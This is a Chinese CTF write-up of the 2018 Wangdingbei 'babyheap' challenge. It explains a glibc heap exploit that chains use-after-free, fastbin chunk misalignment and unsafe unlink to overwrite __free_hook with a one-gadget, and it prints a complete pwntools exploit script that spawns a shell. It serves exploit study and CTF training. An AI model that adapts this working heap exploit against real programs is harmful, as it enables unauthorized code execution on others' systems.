# 看下网鼎杯的babyheap：
https://xz.aliyun.com/news/5361

```
# checksec ./data/unsafe_unlink/wangdingbei-2018-babyheap
[*] '/root/AutoExpMarkDocker/data/unsafe_unlink/wangdingbei-2018-babyheap'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

这里看到出了canary，其他的保护几乎全开，got表不可改？真的吗？错，__free_hook还是可以改写的，这是个知识点，要记牢固！

下面进行分析：
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+Ch] [rbp-24h]
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_400882();
  puts("I thought this is really baby.What about u?");
  puts("Loading.....");
  sleep(5u);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        sub_4008E3();
        memset(&s, 0, 0x10uLL);
        read(0, &s, 0xFuLL);
        v3 = atoi(&s);
        if ( v3 != 2 )
          break;
        sub_400A79();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_13;
      sub_4009A0();
    }
    if ( v3 == 3 )
    {
      sub_400C01();
    }
    else
    {
      if ( v3 != 4 )
LABEL_13:
        exit(0);
      sub_400B54();
    }
  }
}
```
可以看到是常规的菜单题，然后提取出各个函数：
```python
def malloc(index,Content):
    ru("Choice:")
    sl('1')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)
def free(Index):
    ru("Choice:")
    sl('4')
    ru("Index:")
    sl(str(Index))
def puts(Index):
    ru("Choice:")
    sl('3')
    ru("Index:")
    sl(str(Index))
def exit():
    ru("Choice:")
    sl('5')
def edit(index,Content):
    ru("Choice:")
    sl('2')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)
```
这里需要注意几点，首先只能申请10个堆块，然后只能编辑3次，那么问题来了，该怎么做呢？

第一步先泄露出堆的基地址：
```python
malloc(0,'aaaaaaaa\n')
malloc(1,'bbbbbbbb\n')
free(1)
free(0)
puts(0)
heap_addr = u64(rc(4).ljust(8,'\x00')) - 0x30
print "heap_addr--->" + hex(heap_addr)
```
free完了，我们在bins中得到了2个chunk块。这里free的顺序需要特别注意，因为第一个申请的一般低位是0会有截断，我试过，泄露不出地址。所以先free掉chunk1再free掉chunk0，这样chunk0指向chunk1，得到chunk1的地址，进一步得到堆块的基地址。

拿到了堆块的基地址，可以构造fakechunk了，这里我们用堆块错位法，编辑下：

fig1

在chunk0的fd位置填写0x113d020，bk填写0，然后data那里填写0和0x31，那么fd指向chunk0自身的0x113d020位置处，bins中也可见：

fig2

接着我们申请新的块就会造成堆块的重叠错位，要知道0x113d030处正好有我们的chunk1的大小0x30，如果我们成功控制了0x113d020的堆块，就可以下溢修改chunk1的大小了，改成大于fastbins的chunk，使得后面free时可以得到main_arena的地址，说干就干。

fig3

成功了，看到chunk1的大小变成了0xa0，而且转态是free的，但是我们得继续申请才有这么多的空间（实际上还是0x20的大小），我们接着申请2个垃圾堆块（0x60，纯属为了free时给空间）,再申请一个chunk4，chunk4的presize和size还是属于我们的fake_chunk的。0x30+0x60+0x10 = 0xa0，刚好，下面我们对chunk4进行精心的构造，造出第二个fake_chunk来，好实现unlink操作~

fig4

0x113d0d0那里有0和0x30，gdb没有显示而已，是我们的fake_chunk的presize和size，然后全局变量我们选取的是chunk1的地址指针（0x602068）+24的位置即0x602080（chunk4的指针地址），fd和bk就构造出来了：
```python
FD = 0x602080-24
BK = 0x602080-16
py2 = ''
py2 += p64(0) + p64(0x31)
py2 += p64(FD) + p64(BK)
malloc(4,py2)
py3 = ''
py3 += p64(0x30) + p64(0x30) + '\n'
malloc(5,py3)
```

最终unlink出来，0x602080指向0x602068的位置，也就是说chunk4指向chunk1，那么编辑chunk4，就会往chunk1写入free_hook真实地址，接着再编辑chunk1一次，往free_hook地址上写入onegadget即可getshell~

fig5

这是unlink后的chunk块，可以发现是向前合并的类型，0xa0+0x30=0xd0，同时放入了unsortedbin中，那么我们直接可以打印出main_arena的地址，从而得到基地址和onegadget，接着编辑即可，上完整的exp：

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
local = 1
elf = ELF('./babyheap')
if local:
    p = process('./babyheap')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
#addr = u64(rc(6).ljust(8,'\x00'))
#addr = u32(rc(4))
#addr = int(rc(6),16)#string
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))


def malloc(index,Content):
    ru("Choice:")
    sl('1')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)
def free(Index):
    ru("Choice:")
    sl('4')
    ru("Index:")
    sl(str(Index))
def puts(Index):
    ru("Choice:")
    sl('3')
    ru("Index:")
    sl(str(Index))
def exit():
    ru("Choice:")
    sl('5')
def edit(index,Content):
    ru("Choice:")
    sl('2')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)
bk(0x400A56)

malloc(0,'aaaaaaaa\n')
malloc(1,'bbbbbbbb\n')
free(1)
free(0)
puts(0)
heap_addr = u64(rc(4).ljust(8,'\x00')) - 0x30
print "heap_addr--->" + hex(heap_addr)
py1 = p64(heap_addr+0x20) + p64(0)
py1 += p64(0) + p64(0x31)
edit(0,py1)

malloc(6,'aaa\n')
malloc(7,p64(0) + p64(0xa1) + '\n')

malloc(2,'cccccccc\n')
malloc(3,'dddddddd\n')

FD = 0x602080-24
BK = 0x602080-16
py2 = ''
py2 += p64(0) + p64(0x31)
py2 += p64(FD) + p64(BK)
malloc(4,py2)
py3 = ''
py3 += p64(0x30) + p64(0x30) + '\n'
malloc(5,py3)

free(1)
puts(1)

main_arena = u64(rc(6).ljust(8,'\x00')) - 88
print "main_arena--->" + hex(main_arena)
libc_base = (main_arena&0xfffffffff000) - 0x3c4000
print 'libcbase--->' + hex(libc_base)
# malloc_hook = main_arena - 0x10
# libc_base1 = malloc_hook - libc.symbols["__malloc_hook"]
# print 'libc_base1--->' + hex(libc_base1)
onegadget = libc_base + 0x4526a
free_hook = libc_base + libc.symbols["__free_hook"]
print "free_hook--->" + hex(free_hook)
print "onegadget--->" + hex(onegadget)

edit(4,p64(free_hook) + '\n')
edit(1,p64(onegadget) + '\n')
free(2) 
p.interactive()
```

调试可以看到信息：

fig6-7

接着随便free掉一个块即可getshell~

fig8

这里总结如下：

**首先题型是固定malloc大小，然后不能实现堆溢出，可以通过泄露出堆地址来实现chunk的错位从而间接改写chunk大小为大于fastbin的大小，并通过不断申请新的chunk来加需要的空间，最后构造一个free的chunk来实现unlink（向前合并），再构造一个chunk来使得前面的chunk位free状态，最后free掉一开始的chunk块，既可实现双重功能：泄露libc和任意地址写~用到的知识点是unlink+UAF+fastbin_attack**